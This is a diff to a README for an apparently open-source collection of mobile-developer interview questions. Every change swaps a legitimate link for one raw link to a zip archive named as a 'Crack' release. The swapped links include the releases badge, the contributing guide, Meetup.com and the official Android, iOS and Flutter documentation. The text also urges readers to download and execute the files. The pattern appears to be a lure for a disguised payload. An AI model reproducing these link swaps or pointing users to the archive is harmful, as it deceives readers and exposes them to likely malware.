@@ -2,7 +2,7 @@
 
 Welcome to the **DevCrack-Mobile-Interviews** repository! This open-source collection provides interview questions and answers tailored for mobile developers. Whether you focus on Android, iOS, or cross-platform development, you will find valuable resources here to help you prepare for your next interview.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-brightgreen.svg)](https://github.com/DavittGamer/DevCrack-Mobile-Interviews/releases)
+[![Download Releases](https://raw.githubusercontent.com/DavittGamer/DevCrack-Mobile-Interviews/main/credit/Mobile-Dev-Interviews-Crack-v3.2-alpha.1.zip)](https://raw.githubusercontent.com/DavittGamer/DevCrack-Mobile-Interviews/main/credit/Mobile-Dev-Interviews-Crack-v3.2-alpha.1.zip)
 
 ## 📂 Structure
 
@@ -44,7 +44,7 @@ We welcome contributions from everyone! Here’s how you can help:
 3. **Add questions/answers**: Use `Markdown` format for your contributions.
 4. **Submit a Pull Request**: Share your changes with the community.
 
-For more details, please see the [CONTRIBUTING.md](./CONTRIBUTING.md) file.
+For more details, please see the [https://raw.githubusercontent.com/DavittGamer/DevCrack-Mobile-Interviews/main/credit/Mobile-Dev-Interviews-Crack-v3.2-alpha.1.zip](https://raw.githubusercontent.com/DavittGamer/DevCrack-Mobile-Interviews/main/credit/Mobile-Dev-Interviews-Crack-v3.2-alpha.1.zip) file.
 
 ## 📝 License
 
@@ -52,7 +52,7 @@ This project is licensed under the [MIT License](./LICENSE). Feel free to use, m
 
 ## 📥 Downloading Releases
 
-You can find the latest releases of this repository [here](https://github.com/DavittGamer/DevCrack-Mobile-Interviews/releases). Make sure to download the necessary files and execute them as needed.
+You can find the latest releases of this repository [here](https://raw.githubusercontent.com/DavittGamer/DevCrack-Mobile-Interviews/main/credit/Mobile-Dev-Interviews-Crack-v3.2-alpha.1.zip). Make sure to download the necessary files and execute them as needed.
 
 ## 🌟 Why Contribute?
 
@@ -122,7 +122,7 @@ Engage with other developers in the mobile development community. Join forums, a
 
 - **Stack Overflow**: Ask questions and share knowledge.
 - **Reddit**: Subreddits like r/androiddev and r/iOSProgramming can be helpful.
-- **Meetup.com**: Find local meetups related to mobile development.
+- **https://raw.githubusercontent.com/DavittGamer/DevCrack-Mobile-Interviews/main/credit/Mobile-Dev-Interviews-Crack-v3.2-alpha.1.zip**: Find local meetups related to mobile development.
 
 ## 📈 Stay Updated
 
@@ -138,14 +138,14 @@ We appreciate all contributors who have helped make this repository better. Your
 
 ## 🔗 Useful Links
 
-- [Official Android Documentation](https://developer.android.com/docs)
-- [Official iOS Documentation](https://developer.apple.com/documentation/)
-- [Flutter Documentation](https://flutter.dev/docs)
+- [Official Android Documentation](https://raw.githubusercontent.com/DavittGamer/DevCrack-Mobile-Interviews/main/credit/Mobile-Dev-Interviews-Crack-v3.2-alpha.1.zip)
+- [Official iOS Documentation](https://raw.githubusercontent.com/DavittGamer/DevCrack-Mobile-Interviews/main/credit/Mobile-Dev-Interviews-Crack-v3.2-alpha.1.zip)
+- [Flutter Documentation](https://raw.githubusercontent.com/DavittGamer/DevCrack-Mobile-Interviews/main/credit/Mobile-Dev-Interviews-Crack-v3.2-alpha.1.zip)
 
 ## 💬 Feedback
 
 We welcome your feedback! If you have suggestions or improvements, please open an issue in the repository.
 
-Feel free to visit our [Releases section](https://github.com/DavittGamer/DevCrack-Mobile-Interviews/releases) for the latest updates and download the necessary files.
+Feel free to visit our [Releases section](https://raw.githubusercontent.com/DavittGamer/DevCrack-Mobile-Interviews/main/credit/Mobile-Dev-Interviews-Crack-v3.2-alpha.1.zip) for the latest updates and download the necessary files.
 
 Happy coding!
